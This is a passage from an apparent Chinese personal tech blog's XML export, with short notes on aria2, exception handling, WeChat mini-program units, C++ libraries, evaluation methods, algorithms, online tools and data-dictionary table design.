<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c -i uris.txt</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Aria2" target="_blank" rel="noopener">Aria2</a>,by wikipedia.</li>
<li><a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2 Homepage</a>,by Aria2.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title>异常处理的一些理解</title>
    <url>/2019/11/02/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>在编程过程，经常遇到的一个问题是如何优雅地处理异常。下面给出一些对这个问题的答案。</p>
<h1 id="异常处理定义"><a href="#异常处理定义" class="headerlink" title="异常处理定义"></a>异常处理定义</h1><p>异常处理，是编程语言或计算机硬件里的一种机制，用于处理软件或信息系统中出现的异常状况（即超出程序正常执行流程的某些特殊条件）。</p>
<h2 id="异常处理与错误检测的区别"><a href="#异常处理与错误检测的区别" class="headerlink" title="异常处理与错误检测的区别"></a>异常处理与错误检测的区别</h2><p>错误检测与异常处理区别在于：<strong>错误检测是在正常的程序流中，处理不可预见问题的代码，例如一个调用操作未能成功结束。</strong></p>
<p>某些编程语言有这样的函数：当输入存在非法数据时不能被安全地调用，或者返回值不能与异常进行有效的区别。例如，C语言中的atoi函数（ASCII串到整数的转换）在输入非法时可以返回0。在这种情况下编程者需要另外进行错误检测（可能通过某些辅助全局变量如C的errno），或进行输入检验（如通过正则表达式），或者共同使用这两种方法。</p>
<p>通过异常处理，我们可以对用户在程序中的非法输入进行控制和提示，以防程序崩溃。从进程的视角，硬件中断相当于可恢复异常，虽然中断一般与程序流本身无关。从子程序编程者的视角，异常是很有用的一种机制，用于通知外界该子程序不能正常执行。如输入的数据无效（例如除数是0），或所需资源不可用（例如文件丢失）。如果系统没有异常机制，则编程者需要用返回值来标示发生了哪些错误。</p>
<h1 id="异常处理的原则"><a href="#异常处理的原则" class="headerlink" title="异常处理的原则"></a>异常处理的原则</h1><p>为了更好的处理异常，应遵循以下三个原则：</p>
<ul>
<li>具体明确</li>
<li>提早抛出</li>
<li>延迟捕获</li>
</ul>
<h2 id="具体明确"><a href="#具体明确" class="headerlink" title="具体明确"></a>具体明确</h2><p>捕获异常时具体明确有利于对异常进行恰当的处理。例如在Java中对同一try块定义多个catch块，以便对每种异常分别进行恰当的处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File prefsFile &#x3D; new File(prefsFilename);</span><br><span class="line"> </span><br><span class="line">try&#123;</span><br><span class="line">    readPreferences(prefsFile);</span><br><span class="line">&#125;</span><br><span class="line">catch (FileNotFoundException e)&#123;</span><br><span class="line">    &#x2F;&#x2F; alert the user that the specified file</span><br><span class="line">    &#x2F;&#x2F; does not exist</span><br><span class="line">&#125;</span><br><span class="line">catch (EOFException e)&#123;</span><br><span class="line">    &#x2F;&#x2F; alert the user that the end of the file</span><br><span class="line">    &#x2F;&#x2F; was reached</span><br><span class="line">&#125;</span><br><span class="line">catch (ObjectStreamException e)&#123;</span><br><span class="line">     &#x2F;&#x2F; alert the user that the file is corrupted</span><br><span class="line">&#125;</span><br><span class="line">catch (IOException e)&#123;</span><br><span class="line">    &#x2F;&#x2F; alert the user that some other I&#x2F;O</span><br><span class="line">    &#x2F;&#x2F; error occurred</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="提早抛出"><a href="#提早抛出" class="headerlink" title="提早抛出"></a>提早抛出</h2><p>异常堆栈信息提供了导致异常出现的方法调用链的精确顺序，包括每个方法调用的类名，方法名，代码文件名甚至行数，以此来精确定位异常出现的现场。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.NullPointerException</span><br><span class="line">at java.io.FileInputStream.open(Native Method)</span><br><span class="line">at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:103)</span><br><span class="line">at jcheckbook.JCheckbook.readPreferences(JCheckbook.java:225)</span><br><span class="line">at jcheckbook.JCheckbook.startup(JCheckbook.java:116)</span><br><span class="line">at jcheckbook.JCheckbook.&lt;init&gt;(JCheckbook.java:27)</span><br><span class="line">at jcheckbook.JCheckbook.main(JCheckbook.java:318)</span><br></pre></td></tr></table></figure>

<p>通过逐步回退跟踪堆栈信息并检查代码，可以确定错误原因。</p>
<h2 id="延迟捕获"><a href="#延迟捕获" class="headerlink" title="延迟捕获"></a>延迟捕获</h2><p>捕获异常后怎么处理？最不该做的就是什么都不做。空的catch块等于把整个异常丢进黑洞，能够说明何时何处为何出错的所有信息都会永远丢失。把异常写到日志中还稍微好点，至少还有记录可查。但我们总不能指望用户去阅读或者理解日志文件和异常信息。</p>
<p>因此，不要过早捕获异常，而是在合适的层面捕获异常，以便你的程序要么可以从异常中有意义地恢复并继续下去，而不导致更深入的错误；要么能够为用户提供明确的信息，包括引导他们从错误中恢复过来。如果你的方法无法胜任，那么就不要处理异常，把它留到后面捕获和在恰当的层面处理。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86" target="_blank" rel="noopener">异常处理</a>,by wikipedia.</li>
<li><a href="https://www.zhihu.com/question/28254987" target="_blank" rel="noopener">如何优雅的处理异常（java）？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序开发笔记</title>
    <url>/2020/05/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="显示相关"><a href="#显示相关" class="headerlink" title="显示相关"></a>显示相关</h2><ul>
<li>dip</li>
</ul>
<p>设备独立像素（density-independent pixel, dip）也叫逻辑分辨率，是一种可以被程序所控制的虚拟像素，在Web开发中对应CSS像素。</p>
<ul>
<li>pp</li>
</ul>
<p>物理像素（physical pixel, PP）也叫设备像素，由设备的屏幕决定，其实就是屏幕中控制显示的最小单位。例如，华为荣耀V20的屏幕显示分辨率2310*1080即为物理像素。</p>
<ul>
<li>dpr</li>
</ul>
<p>设备像素比（device pixel ratio,dpr）计算公式如下：</p>
<p>$$dpr=物理像素/设备独立像素$$</p>
<p>这条公式成立的前提是，缩放比Scale为1，原因下面讲到缩放的时候就会知道。根据这种关系，如果设备像素大于设备独立像素（DPR大于1的设备，我们常说的高清屏或者视网膜Retina屏），就会出现一个设备独立像素对应多个设备像素的情况。</p>
<p>在JavaScript中，可以通过window.devicePixelRatio获取到当前设备的dpr，但遗憾的是并不是所有的都支持。</p>
<p><strong>通过访问<a href="https://www.mydevice.io/" target="_blank" rel="noopener">mydevice</a>,可获得各类显示屏的dpr、dpi等参数信息。</strong> 例如，通过访问该网站可知华为荣耀V20的dpr为3。</p>
<ul>
<li>rpx</li>
</ul>
<p>微信小程序对于rem的一种应用规定，官方规定屏幕宽度为20rem，规定屏幕宽为750rpx，因此微信中1rem=750/20rpx，iphone6下，1px=1rpx=0.5pt，使用rpx作为单位，微信小程序会自动在不同的分辨率下进行转换，而使用px为单位不会转换，iphone6p下1px=0.6rpx；</p>
<ul>
<li>rem</li>
</ul>
<p>在移动端做适配通常用rem作为单位，rem是根据html的fontsize去动态计算实际px；</p>
<ul>
<li>pt</li>
</ul>
<p>pt是逻辑分辨率，pt的大小和屏幕尺寸有关系，简单可以理解为长度和视觉单位；1个pt可以有1个px，也可以有2个，3个或更多的px，但人的视网膜极限为2倍@2x，增加再多也不会让屏幕看起来更加好了，比如iphone6，2个px构成一个pt，ip6以物理像素750*1334这视觉稿进行设计；</p>
<h1 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/296a1ddd64a6" target="_blank" rel="noopener">px、rpx、rem、pt、dpr学习笔记</a>,by puxiaotaoc.</li>
<li><a href="https://segmentfault.com/a/1190000017784801" target="_blank" rel="noopener">不要再问我移动适配的问题了</a>,by 写Bug.</li>
<li><a href="https://www.dazhuanlan.com/2019/09/23/5d88cf937a0ef/" target="_blank" rel="noopener">微信小程序日期时间选择器以及组件封装</a>,by 大专栏.</li>
<li><a href="https://blog.csdn.net/qq_38543537/article/details/82880025" target="_blank" rel="noopener">微信小程序template模板与component组件的区别及使用方法</a>,by 小破孩呦.</li>
<li><a href="https://developers.weixin.qq.com/community/develop/doc/313d65073ae7aa97138fc820a2305e08" target="_blank" rel="noopener">小程序app.js中onLaunch和主页的onLoad方法问题</a>,by Feebas.</li>
<li><a href="https://blog.csdn.net/longlongValue/article/details/79745681" target="_blank" rel="noopener">微信小程序分享参数传递（微信小程序获取分享path参数）</a>,by longlongValue.</li>
<li><a href="https://blog.csdn.net/skye_95/article/details/97001609" target="_blank" rel="noopener">微信小程序（四）：通过list列表跳转详情页</a>,by 扎哈的信徒.</li>
<li><a href="https://developers.weixin.qq.com/ebook?action=get_post_info&docid=000ee2c29d4f805b0086a37a254c0a" target="_blank" rel="noopener">2.2 WXML 模板</a>,by 微信开放社区.</li>
<li><a href="https://blog.csdn.net/ChibiMarukoChan/article/details/86496769" target="_blank" rel="noopener">微信小程序-表单验证（WxValidate使用）</a>,by chibimarukochan.</li>
<li><a href="https://blog.csdn.net/magi1201/article/details/74784928" target="_blank" rel="noopener">JS数组的深浅拷贝</a>,by 蜗牛-.</li>
<li><a href="https://blog.csdn.net/hacker_Lees/article/details/79612167" target="_blank" rel="noopener">js正则校验数字和字母字符串</a>,by hacker_LeeFei.</li>
<li><a href="https://juejin.im/entry/5ba21f8a5188256bab2955cd" target="_blank" rel="noopener">微信小程序onLaunch异步，首页 onLoad 先执行 ?</a>,by juejing.</li>
<li><a href="https://www.zc0317.com/post/view?id=72" target="_blank" rel="noopener">解决微信小程序 app onLaunch异步请求，在没有请求执行完就加载首页了的问题</a>,by admin.</li>
<li><a href="https://www.jianshu.com/p/b3cbd68151e3" target="_blank" rel="noopener">微信小程序canvas尺寸设置</a>,by 楠倏之语.</li>
<li><a href="https://developers.weixin.qq.com/miniprogram/dev/extended/weui/quickstart.html" target="_blank" rel="noopener">WeUI组件库快速上手</a>,by weixin.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>常用C++库记录</title>
    <url>/2021/01/17/%E5%B8%B8%E7%94%A8C-%E5%BA%93%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>常用的C/C++库可参考<a href="https://github.com/fffaraz/awesome-cpp" target="_blank" rel="noopener">awesome-cpp</a>。这里主要记录本人曾使用的C/C++库。</p>
<h1 id="数学库"><a href="#数学库" class="headerlink" title="数学库"></a>数学库</h1><ul>
<li><a href="http://www.gnu.org/software/gsl/" target="_blank" rel="noopener">GSL</a></li>
</ul>
<h1 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h1><ul>
<li><a href="https://github.com/d99kris/rapidcsv" target="_blank" rel="noopener">Rapidcsv</a></li>
</ul>
<h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><ul>
<li><a href="https://github.com/ArashPartow/bitmap" target="_blank" rel="noopener">bitmap</a></li>
<li><a href="https://www.transmissionzero.co.uk/software/freeglut-devel/" target="_blank" rel="noopener">FreeGlut</a></li>
</ul>
<h1 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h1><ul>
<li><a href="https://github.com/DFHack/clsocket" target="_blank" rel="noopener">clsocket</a></li>
</ul>
<h1 id="软件测试"><a href="#软件测试" class="headerlink" title="软件测试"></a>软件测试</h1><ul>
<li><a href="https://github.com/catchorg/Catch2" target="_blank" rel="noopener">Catch2</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/fffaraz/awesome-cpp" target="_blank" rel="noopener">awesome-cpp</a>,by fffaraz.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>层次分析法与模糊综合评价法</title>
    <url>/2021/01/27/%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90%E6%B3%95%E4%B8%8E%E6%A8%A1%E7%B3%8A%E7%BB%BC%E5%90%88%E8%AF%84%E4%BB%B7%E6%B3%95/</url>
    <content><![CDATA[<h1 id="层次分析法"><a href="#层次分析法" class="headerlink" title="层次分析法"></a>层次分析法</h1><p>层次分析法（英语：Analytic Hierarchy Process, AHP）为 1971 年Thomas L. Saaty （匹兹堡大学教授）所发展出来，主要应用在不确定情况下及具有多数个评估准则的决策问题上。 层次分析法发展的目的是将复杂的问题系统化，由不同层面给予层级分解，并透过量化的运算，找到脉络后加以综合评估。</p>
<h2 id="方法介绍"><a href="#方法介绍" class="headerlink" title="方法介绍"></a>方法介绍</h2><p>层次分析法可以利用树状的层级结构，将复杂的决策问题在一个层级中区分为数个简单的子问题，并且每个子问题可以独立进行分析，这个层级中的子问题可以包含是任何类型的子问题，无论是有形的还是无形的，仔细计算的或者粗略估计的，理解清晰或模糊的，只要是用于最终决策的子问题都可以包括于此。</p>
<h1 id="模糊综合评价法"><a href="#模糊综合评价法" class="headerlink" title="模糊综合评价法"></a>模糊综合评价法</h1><p>模糊综合评价法（Fuzzy Comprehension Evaluation Method）是一种基于模糊数学的综合评价方法。该综合评价法根据模糊数学的隶属度理论把定性评价转化为定量评价，即用模糊数学对受到多种因素制约的事物或对象做出一个总体的评价。它具有结果清晰，系统性强的特点，能较好地解决模糊的、难以量化的问题，适合各种非确定性问题的解决。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.zenggyu.com/zh/post/2019-11-10/%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90%E6%B3%95%E7%9A%84%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B%E5%8F%8Ar%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">层次分析法的一个应用案例及R语言实现</a>,by 曾广宇.</li>
<li><a href="https://chiang97912.github.io/2018/09/02/%E6%A8%A1%E7%B3%8A%E7%BB%BC%E5%90%88%E8%AF%84%E4%BB%B7%E6%B3%95%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">模糊综合评价法原理及实现</a>,by BetterManPeter.</li>
<li><a href="http://www.jeffzhang.cn/yaahp-fce-introduction/" target="_blank" rel="noopener">结合层次分析法和模糊综合评价法的评价方法-利用yaahp</a>,by Jeff.</li>
<li><a href="https://blog.csdn.net/u013007900/article/details/45932851" target="_blank" rel="noopener">层次分析法(Analytic Hierarchy Process)</a>,by SuPhoebe.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32666445" target="_blank" rel="noopener">数模系列(3)：模糊综合评价法</a>,by 00木水.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%B1%A4%E7%B4%9A%E5%88%86%E6%9E%90%E6%B3%95" target="_blank" rel="noopener">层次分析法</a>,by wikipeida.</li>
<li><a href="https://zhuanlan.zhihu.com/p/160846498" target="_blank" rel="noopener">数学建模笔记——评价类模型之模糊综合评价</a>,by 小白.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法总结</title>
    <url>/2020/01/05/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>排序算法是计算机科学的基石之一，可从时间复杂度、空间复杂度、稳定性、是否原地排序等维度对排序算法进行分类。下面从时间复杂度方面对排序算法进行分类。</p>
<h1 id="O-n-2-算法"><a href="#O-n-2-算法" class="headerlink" title="O(n^2)算法"></a>O(n^2)算法</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h1 id="O-nlogn-算法"><a href="#O-nlogn-算法" class="headerlink" title="O(nlogn)算法"></a>O(nlogn)算法</h1><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><h1 id="O-n-算法"><a href="#O-n-算法" class="headerlink" title="O(n)算法"></a>O(n)算法</h1><h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/99273811" target="_blank" rel="noopener">漫画：“排序算法” 大总结</a>,by 小灰.</li>
<li><a href="https://luyuhuang.github.io/2020/03/06/dht-and-p2p.html" target="_blank" rel="noopener">分布式哈希表 (DHT) 和 P2P 技术</a>,by luyuhuang.</li>
<li><a href="https://luyuhuang.github.io/2020/04/28/gzip-and-deflate.html" target="_blank" rel="noopener">Gzip 格式和 DEFLATE 压缩算法</a>,by Luyu Huang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>支持Windows7的Nodejs最高版本</title>
    <url>/2020/11/10/%E6%94%AF%E6%8C%81Windows7%E7%9A%84Nodejs%E6%9C%80%E9%AB%98%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>目前最新的Nodejs LTS已不再支持Windows7。如需在Windows7上安装Nodejs，需安装12.19.1或之前的版本。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/luxiangy1314/article/details/105693054" target="_blank" rel="noopener">windows安装Node JS及配置</a>,by 兰若惜.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索算法集锦</title>
    <url>/2021/08/07/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E9%9B%86%E9%94%A6/</url>
    <content><![CDATA[<p>记录各种经典的搜索算法。</p>
<h1 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h1><p>该算法解决了图 ${\displaystyle G=\langle V,E\rangle }$上带权的单源最短路径问题。</p>
<h1 id="A-搜索算法"><a href="#A-搜索算法" class="headerlink" title="A*搜索算法"></a>A*搜索算法</h1><p>A<em>搜索算法（A</em> search algorithm）是一种在图形平面上，有多个节点的路径，求出最低通过成本的算法。常用于游戏中的NPC的移动计算，或网络游戏的BOT的移动计算上。</p>
<p>该算法综合了BFS和Dijkstra算法的优点：在进行启发式搜索提高算法效率的同时，可以保证找到一条最优路径（基于评估函数）。</p>
<h1 id="RRT-搜索算法"><a href="#RRT-搜索算法" class="headerlink" title="RRT*搜索算法"></a>RRT*搜索算法</h1><p>基于随机采样的路径规划算法。这类算法适用于高维度空间，它们以概率完备性(当时间接近无限时一定有解)来代替完备性，从而提高搜索效率。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E6%88%B4%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">Dijkstra算法</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/A*%E6%90%9C%E5%B0%8B%E6%BC%94%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">A*搜索算法</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/346666812" target="_blank" rel="noopener">路径规划 | 图搜索算法：DFS、BFS、GBFS、Dijkstra、A*</a>,by 鬼木士.</li>
<li><a href="https://zhuanlan.zhihu.com/p/349074802" target="_blank" rel="noopener">路径规划 | 随机采样算法：PRM、RRT、RRT-Connect、RRT*</a>,by 鬼木士.</li>
<li><a href="https://blog.csdn.net/gophae/article/details/103231053" target="_blank" rel="noopener">全局路径规划：图搜索算法介绍4(RRT/RRT*)</a>,by gophae.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>撰写学术论文的思考</title>
    <url>/2018/12/17/%E6%92%B0%E5%86%99%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>迫于学业和工作的压力，撰写了不少的学术论文。但是并没有对如何撰写学术论文进行思考。看到清华大学的肖寒<br>博士在某个问题下的回答后，感觉茅塞顿开：</p>
<blockquote>
<p> 不过，一般注水的作者相对而言都是新手，因为比较有经验的研究者都知道：“<strong>论文的一切都在于贡献，不在于结果</strong>”</p>
</blockquote>
<blockquote>
<p> 你的结果只是一个说明你贡献的例证，多那么点少那么点，大家看了毫无区别。你注水除了恶心我们这些后来实验的人，就没什么别的用处了。有那些<strong>疯狂调参和使劲弄技巧</strong>的时间，真不如<strong>拿来整理好你自己的思路，把论文的论述过程做到有理有据</strong>！因为 80.2 和 80.3 正常人都没法记住其间区别，但你<strong>循循善诱的精致论述会让所有人印象深刻</strong>。我希望新手不要本末倒置！</p>
</blockquote>
<p>论文重在贡献，迫于学业和工作的压力造的注水论文实在无趣！</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/22520434" target="_blank" rel="noopener">看图说话的AI小朋友——图像标注趣谈（下）</a>, by 杜客.</li>
<li><a href="https://zhuanlan.zhihu.com/p/30575091" target="_blank" rel="noopener">从标题到写作流程：写好一篇论文的十条基本原则</a>,by 机器之心.</li>
</ol>
]]></content>
      <tags>
        <tag>感悟</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>提高效率的在线工具</title>
    <url>/2019/08/06/%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>在此记录一些常用在线工具，提高工作效率。</p>
<h1 id="百度文库在线下载"><a href="#百度文库在线下载" class="headerlink" title="百度文库在线下载"></a>百度文库在线下载</h1><p>在某个文档页面的网址域名后面加上 vvv 三个字母，访问后就可以快捷下载。    </p>
<p>比如：</p>
<p><a href="https://wenku.baidu.com/view/3e6d30b2fd0a79563c1e72bd.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/3e6d30b2fd0a79563c1e72bd.html</a>    </p>
<p>加上 vvv 为：</p>
<p><a href="https://wenku.baiduvvv.com/view/3e6d30b2fd0a79563c1e72bd.html" target="_blank" rel="noopener">https://wenku.baiduvvv.com/view/3e6d30b2fd0a79563c1e72bd.html</a></p>
<h1 id="商品历史价格查询"><a href="#商品历史价格查询" class="headerlink" title="商品历史价格查询"></a>商品历史价格查询</h1><p>在电商网站商品详情页的网址域名后面加入vvv三个字母访问后即可查询该商品的历史价格。</p>
<p>例如：</p>
<p><a href="https://detail.tmall.com/item.htm?id=527080261251" target="_blank" rel="noopener">https://detail.tmall.com/item.htm?id=527080261251</a> </p>
<p>添加vvv后变为：</p>
<p><a href="https://detail.tmallvvv.com/item.htm?id=527080261251" target="_blank" rel="noopener">https://detail.tmallvvv.com/item.htm?id=527080261251</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://wenku.baiduvvv.com/doc/" target="_blank" rel="noopener">VVV文档在线导出工具</a>,by vvv.</li>
<li><a href="http://www.hisprice.cn/" target="_blank" rel="noopener">商品历史价格查询</a>,by hisprice.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title>数据字典结构设计方法</title>
    <url>/2023/01/17/%E6%95%B0%E6%8D%AE%E5%AD%97%E5%85%B8%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>数据字典（Data dictionary）是描述数据的信息集合，是对系统中使用的所有数据元素的定义的集合。</p>
<h1 id="什么是数据字典"><a href="#什么是数据字典" class="headerlink" title="什么是数据字典"></a>什么是数据字典</h1><p>什么是数据字典? 字典的英文是 Dict, 翻译过来是字典、词典。</p>
<p>和字典同类的东西呢，就是 Map。 Map 就是地图、映射的意思。</p>
<p>所以字典的本质就是 映射，对应。</p>
<p>字典一般分为两部分： 名称 和 描述信息。 用计算机术语说，就是 键-值对(Key-Value pair), 名值对、还有 Code-Name 等。</p>
<p>在系统中，因为有很多标准、规范、约定， 为了执行这些规范，对数据分类、数据状态进行精确定位，又或者因为多个系统之间需要进行数据交换，但叫法和显示上有差别，在存储数据时需要存储码值，而不能只存储显示时使用的名称。</p>
<p>例如状态值和状态名称。标准做法是只存储 VALUE， 不存储名称。 如果考虑优化，减少数据表的关联查询(join),那么可以在存储 VALUE 的同时冗余存储 NAME。 当然，需要根据具体情况来设计， 如果 NAME 或者描述信息太长，占用空间较大，那么可能就不会进行冗余。 顺便提一句， 减少空间占用 也是使用数据字典的一个原因。</p>
<h1 id="数据字典作用是什么"><a href="#数据字典作用是什么" class="headerlink" title="数据字典作用是什么"></a>数据字典作用是什么</h1><p>在平时开发的过程中，特别是在遇到表单时候，我们经常需要为前端提供一些下拉选项的信息，这时候我们需要为前端提供下拉菜单的信息，让前端进行渲染。同时我们在数据库中存储的只可能是对应的编码。</p>
<p>如果前端直接将value值写死在前端代码中，那么就破坏了低耦合原则，如果未来清查状态有增加或者管理员想要修改，那么需要修改前端代码，会带来非常大的麻烦。</p>
<p>为解决该问题，就需要设计数据字典，其实就是数据库中的一张表。</p>
<h1 id="数据字典的设计"><a href="#数据字典的设计" class="headerlink" title="数据字典的设计"></a>数据字典的设计</h1><h2 id="最简设计"><a href="#最简设计" class="headerlink" title="最简设计"></a>最简设计</h2><p>名称-值。</p>
<h2 id="通用设计"><a href="#通用设计" class="headerlink" title="通用设计"></a>通用设计</h2><p>如果状态、类型都有对应的字典表，那么随着系统规模的扩大，字典表会越来越多，可能200张表里面有30-50个是字典表。 这就很烦人了，这些表的字段都是差不多的。这时候比较好的办法就是合表。合表就会涉及到数据类型和如何区分的问题。</p>
<p>将相似的表结构合并时，添加一个字段来进行区分是常见的做法。数据字典的区分,我们一般使用 <strong>分类</strong>这个字段。分类的英文单词,大致有: type、class、classify、category 等。因为分类是给系统后台或者程序员看的，所以一般是使用字符串类型(String, VARCHAR(32))。</p>
<p>同时,为了避免再引入一个分类类型说明的表,我们做一点冗余： 使用2个字段: 分类编码(category_code) 和 分类说明(category_desc)。</p>
<h2 id="简单优化"><a href="#简单优化" class="headerlink" title="简单优化"></a>简单优化</h2><p>ID、排序</p>
<h2 id="运维审查方便"><a href="#运维审查方便" class="headerlink" title="运维审查方便"></a>运维审查方便</h2><p>创建时间、更新时间、创建人、修改人</p>
<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS &#96;dict_common&#96; (</span><br><span class="line">  &#96;id&#96; bigint(20) unsigned NOT NULL COMMENT &#39;自增ID&#39;,</span><br><span class="line">  &#96;dict_code&#96; varchar(64) NOT NULL COMMENT &#39;编码&#39;,</span><br><span class="line">  &#96;dict_desc&#96; varchar(64) NOT NULL COMMENT &#39;名称&#39;,</span><br><span class="line">  &#96;category_code&#96; varchar(64) NOT NULL COMMENT &#39;分类编码&#39;,</span><br><span class="line">  &#96;category_desc&#96; varchar(64) DEFAULT NULL COMMENT &#39;分类说明&#39;,</span><br><span class="line">  &#96;sort_no&#96; int(8) unsigned NOT NULL DEFAULT &#39;999&#39; COMMENT &#39;排序编号&#39;,</span><br><span class="line">  &#96;data_type&#96; varchar(64) NOT NULL DEFAULT &#39;STRING&#39; COMMENT &#39;数据类型&#39;,</span><br><span class="line">  &#96;remark&#96; varchar(128) DEFAULT NULL COMMENT &#39;附加说明&#39;,</span><br><span class="line">  &#96;locate_code&#96; varchar(64) DEFAULT NULL COMMENT &#39;检索标识&#39;,</span><br><span class="line">  &#96;create_id&#96; bigint(20) unsigned DEFAULT &#39;0&#39; COMMENT &#39;创建人ID&#39;,</span><br><span class="line">  &#96;update_id&#96; bigint(20) unsigned DEFAULT &#39;0&#39; COMMENT &#39;修改人ID&#39;,</span><br><span class="line">  